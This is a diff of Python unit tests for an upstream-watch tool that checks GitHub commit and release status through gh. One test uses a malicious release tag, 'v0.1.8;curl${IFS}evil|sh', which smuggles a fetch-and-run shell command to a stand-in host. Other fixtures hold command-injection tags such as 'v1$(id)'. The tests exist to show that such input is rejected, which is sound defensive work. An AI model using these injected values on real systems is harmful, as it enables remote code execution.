@@ -391,8 +391,9 @@ class LoadStateTests(TempFiles):
         seeded = os.path.join(os.path.dirname(TOOLS), "docs", "reviews", "upstream-watch.json")
         state = uw.load_state(seeded)
         self.assertEqual([r["repo"] for r in state["repos"]], ["yotthani/bannerlord", "yotthani/MithrilForge"])
-        for r in state["repos"]:
+        for r in state["repos"] + state.get("releases", []):
             self.assertTrue(os.path.isfile(os.path.join(os.path.dirname(TOOLS), r["record"])), r["record"])
+        self.assertEqual([r["repo"] for r in state["releases"]], ["Bannerlord-Coop-Team/BannerlordCoop"])
 
     def test_bad_sha_rejected(self):
         self.write_state(state_with(dict(ENTRY, reviewed="abc123")))
@@ -428,6 +429,255 @@ class LoadStateTests(TempFiles):
             self.write_state(state_with(bad))
             with self.assertRaises(uw.StateError):
                 uw.load_state(self.state_path)
+
+
+RELEASE = {
+    "repo": "Bannerlord-Coop-Team/BannerlordCoop",
+    "seen": "v0.1.7",
+    "seen_on": "2026-10-30",
+    "record": "docs/features/coop-interop.md",
+}
+
+
+def release_reply(tag):
+    return (0, json.dumps({"tag_name": tag, "published_at": "2026-10-30T21:47:48Z", "prerelease": False}), "")
+
+
+class RouterGh:
+    """Answers by endpoint: the commit compare and the latest-release read are different calls. `release`
+    is one reply, or a dict of repo name to reply; `release_raises` fails only the release reads;
+    `clock` and `step` move a FakeClock by `step` seconds on each compare call."""
+
+    def __init__(self, compare=None, release=None, raises=None, release_raises=None, clock=None, step=0.0):
+        self.compare, self.release, self.raises = compare, release, raises
+        self.release_raises, self.clock, self.step = release_raises, clock, step
+        self.calls = []
+
+    def __call__(self, args, timeout):
+        self.calls.append((list(args), timeout))
+        if self.raises is not None:
+            raise self.raises
+        if args[1].endswith("/releases/latest"):
+            if self.release_raises is not None:
+                raise self.release_raises
+            if isinstance(self.release, dict):
+                return next(v for k, v in self.release.items() if "repos/%s/" % k in args[1])
+            return self.release
+        if self.clock is not None:
+            self.clock.t += self.step
+        return self.compare
+
+
+def state_with_release(*releases, repos=(ENTRY,)):
+    return {"version": 1, "repos": list(repos), "releases": list(releases)}
+
+
+class ReleaseStatusTests(TempFiles):
+    def test_new_release_prints_one_line_naming_the_record_and_the_seen_command(self):
+        self.write_state(state_with_release(RELEASE))
+        code, out = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
+        self.assertEqual(code, 0)
+        self.assertEqual(
+            out,
+            "UPSTREAM RELEASE: Bannerlord-Coop-Team/BannerlordCoop published v0.1.8 (last seen v0.1.7 on "
+            "2026-10-30; record docs/features/coop-interop.md); update the record, then run "
+            "python tools/upstream_watch.py seen --repo Bannerlord-Coop-Team/BannerlordCoop --tag v0.1.8\n",
+        )
+
+    def test_the_seen_release_prints_nothing(self):
+        self.write_state(state_with_release(RELEASE))
+        self.assertEqual(self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.7"))), (0, ""))
+
+    def test_release_call_is_one_read_only_get(self):
+        self.write_state(state_with_release(RELEASE))
+        gh = RouterGh(compare_reply(0), release_reply("v0.1.7"))
+        self.run_status(gh)
+        self.assertEqual(gh.calls[-1][0], ["api", "repos/Bannerlord-Coop-Team/BannerlordCoop/releases/latest"])
+        self.assertEqual(len(gh.calls), 2)
+
+    def test_fresh_release_cache_skips_gh(self):
+        self.write_state(state_with_release(RELEASE))
+        self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
+        gh = RouterGh(raises=AssertionError("must not call gh"))
+        code, out = self.run_status(gh, now=NOW + 3600)
+        self.assertEqual(gh.calls, [])
+        self.assertIn("published v0.1.8", out)
+
+    def test_cached_tag_is_judged_against_the_current_seen(self):
+        self.write_state(state_with_release(RELEASE))
+        self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
+        self.write_state(state_with_release(dict(RELEASE, seen="v0.1.8")))
+        code, out = self.run_status(RouterGh(raises=AssertionError("must not call gh")), now=NOW + 60)
+        self.assertEqual((code, out), (0, ""))
+
+    def test_a_404_is_that_repos_problem_and_says_so(self):
+        self.write_state(state_with_release(RELEASE))
+        code, out = self.run_status(RouterGh(compare_reply(2), (1, "", "gh: Not Found (HTTP 404)")))
+        self.assertIn("UPSTREAM AHEAD: yotthani/bannerlord has 2 new commits", out)
+        self.assertIn("NOTE: upstream review drift UNCHECKED this session (Bannerlord-Coop-Team/BannerlordCoop release:", out)
+        self.assertIn("no published release", out)
+
+    def test_a_systemic_gh_failure_stops_the_release_checks_too(self):
+        self.write_state(state_with_release(RELEASE))
+        gh = RouterGh(raises=FileNotFoundError())
+        code, out = self.run_status(gh)
+        self.assertEqual(len(gh.calls), 1)
+        self.assertEqual(out, "NOTE: upstream review drift UNCHECKED this session (gh not installed)\n")
+
+    def test_full_status_lists_the_release_and_a_new_one_exits_one(self):
+        self.write_state(state_with_release(RELEASE))
+        code, out = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")), brief=False)
+        self.assertEqual(code, 1)
+        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop  release seen v0.1.7 (2026-10-30)  latest v0.1.8  [live]", out)
+
+    def test_a_non_plain_tag_is_that_repos_problem_and_never_printed_as_a_command(self):
+        self.write_state(state_with_release(RELEASE))
+        code, out = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8;curl${IFS}evil|sh")))
+        self.assertNotIn("UPSTREAM RELEASE", out)
+        self.assertNotIn("curl", out)
+        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop", out)
+        self.assertIn("not a plain tag", out)
+
+    def test_plain_tags_of_real_shapes_are_accepted(self):
+        for tag in ("v0.1.7", "v1.0.0-beta.1", "1.2.3+build.5", "release/1.0"):
+            with self.subTest(tag=tag):
+                self.assertTrue(uw.TAG_RE.fullmatch(tag))
+        for tag in ("v1;id", "v1$(id)", "v1`id`", "v1&&echo", "v1>out", "-v1", "v\u202e1", "v" * 101):
+            with self.subTest(tag=tag):
+                self.assertIsNone(uw.TAG_RE.fullmatch(tag))
+
+    def test_release_read_failure_after_a_live_compare_names_the_release(self):
+        self.write_state(state_with_release(RELEASE))
+        gh = RouterGh(compare_reply(0), release_raises=subprocess.TimeoutExpired("gh", 2.5))
+        code, out = self.run_status(gh)
+        self.assertEqual(code, 0)
+        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop release: gh slow", out)
+
+    def test_malformed_release_answer_is_unchecked_and_names_the_release(self):
+        for body in ("{}", "[]", json.dumps({"tag_name": 7})):
+            with self.subTest(body=body):
+                self.write_state(state_with_release(RELEASE))
+                if os.path.exists(self.cache_path):
+                    os.remove(self.cache_path)
+                code, out = self.run_status(RouterGh(compare_reply(0), (0, body, "")))
+                self.assertIn("Bannerlord-Coop-Team/BannerlordCoop release: unexpected gh answer", out)
+
+    def test_budget_spent_by_the_compare_skips_the_release_read(self):
+        self.write_state(state_with_release(RELEASE))
+        clock = FakeClock()
+        gh = RouterGh(compare_reply(0), release_reply("v0.1.8"), clock=clock, step=1.0)
+        code, out = self.run_status(gh, budget=1.2, mono=clock)
+        self.assertEqual(len(gh.calls), 1)
+        self.assertIn("time budget spent", out)
+
+    def test_stale_release_cache_is_used_when_gh_fails(self):
+        self.write_state(state_with_release(RELEASE))
+        self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
+        code, out = self.run_status(RouterGh(raises=FileNotFoundError()), brief=False, now=NOW + 21 * 3600)
+        self.assertEqual(code, 1)
+        self.assertIn("latest v0.1.8  [stale cache]", out)
+
+    def test_malformed_release_cache_entry_is_no_cache(self):
+        self.write_state(state_with_release(RELEASE))
+        os.makedirs(os.path.dirname(self.cache_path), exist_ok=True)
+        for entry in ({"tag": "v1;id", "checked_at": NOW}, {"tag": "v0.1.8", "checked_at": "now"}, ["v0.1.8"]):
+            with self.subTest(entry=entry):
+                with open(self.cache_path, "w", encoding="utf-8") as f:
+                    json.dump({"repos": {"release:" + RELEASE["repo"]: entry}}, f)
+                gh = RouterGh(compare_reply(0), release_reply("v0.1.7"))
+                self.run_status(gh)
+                self.assertEqual(len(gh.calls), 2)
+
+    def test_a_404_on_one_release_still_reads_the_next(self):
+        other = dict(RELEASE, repo="someone/else")
+        self.write_state(state_with_release(RELEASE, other))
+        gh = RouterGh(compare_reply(0), {RELEASE["repo"]: (1, "", "gh: Not Found (HTTP 404)"),
+                                         "someone/else": release_reply("v9")})
+        code, out = self.run_status(gh)
+        self.assertIn("UPSTREAM RELEASE: someone/else published v9", out)
+        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop release:", out)
+        self.assertIn("no published release", out)
+
+    def test_full_status_with_the_release_seen_exits_zero(self):
+        self.write_state(state_with_release(RELEASE))
+        code, _ = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.7")), brief=False)
+        self.assertEqual(code, 0)
+
+
+class ReleaseStateTests(TempFiles):
+    def load(self, data):
+        self.write_state(data)
+        return uw.load_state(self.state_path)
+
+    def test_state_without_releases_still_loads(self):
+        self.assertNotIn("releases", self.load(state_with(ENTRY)))
+
+    def test_releases_must_be_a_list(self):
+        with self.assertRaises(uw.StateError):
+            self.load({"repos": [ENTRY], "releases": {}})
+
+    def test_release_entry_needs_every_field(self):
+        for field in ("repo", "seen", "seen_on", "record"):
+            bad = dict(RELEASE)
+            del bad[field]
+            with self.subTest(field=field), self.assertRaises(uw.StateError):
+                self.load(state_with_release(bad))
+
+    def test_bad_release_values_are_rejected(self):
+        for field, value in (("repo", "no-slash"), ("seen", ""), ("seen", "v 1"), ("seen_on", "30-10-2026"),
+                             ("record", "")):
+            with self.subTest(field=field, value=value), self.assertRaises(uw.StateError):
+                self.load(state_with_release(dict(RELEASE, **{field: value})))
+
+    def test_duplicate_release_repo_rejected(self):
+        with self.assertRaises(uw.StateError):
+            self.load(state_with_release(RELEASE, dict(RELEASE)))
+
+
+class SeenTests(TempFiles):
+    def setUp(self):
+        super().setUp()
+        self.write_state(state_with_release(RELEASE))
+
+    def seen(self, repo=RELEASE["repo"], tag="v0.1.8", date="2026-11-02"):
+        with contextlib.redirect_stderr(io.StringIO()):
+            return uw.run_seen(self.state_path, repo, tag, date)
+
+    def data(self):
+        with open(self.state_path, encoding="utf-8") as f:
+            return json.load(f)
+
+    def test_seen_records_the_tag_and_date(self):
+        self.assertEqual(self.seen(), 0)
+        r = self.data()["releases"][0]
+        self.assertEqual((r["seen"], r["seen_on"], r["record"]), ("v0.1.8", "2026-11-02", RELEASE["record"]))
+        self.assertEqual(self.data()["repos"][0], ENTRY)
+
+    def test_seen_rewrite_is_stable_lf_json(self):
+        self.seen()
+        with open(self.state_path, encoding="utf-8", newline="") as f:
+            first = f.read()
+        self.assertNotIn("\r", first)
+        self.assertTrue(first.endswith("}\n"))
+        self.seen()
+        with open(self.state_path, encoding="utf-8", newline="") as f:
+            self.assertEqual(f.read(), first)
+
+    def test_invalid_input_leaves_the_file_untouched(self):
+        with open(self.state_path, encoding="utf-8") as f:
+            before = f.read()
+        for kwargs in ({"repo": "nobody/else"}, {"tag": ""}, {"tag": "v 2"}, {"tag": "v1;id"},
+                       {"date": "2026-13-40"}):
+            with self.subTest(**kwargs):
+                self.assertEqual(self.seen(**kwargs), 2)
+        with open(self.state_path, encoding="utf-8") as f:
+            self.assertEqual(f.read(), before)
+
+    def test_cli_seen_reaches_run_seen(self):
+        with mock.patch.object(uw, "run_seen", return_value=0) as run_seen:
+            self.assertEqual(uw.main(["--state", self.state_path, "seen", "--repo", RELEASE["repo"],
+                                      "--tag", "v0.1.8", "--date", "2026-11-02"]), 0)
+        run_seen.assert_called_once_with(self.state_path, RELEASE["repo"], "v0.1.8", "2026-11-02")
 
 
 class AreaTests(unittest.TestCase):
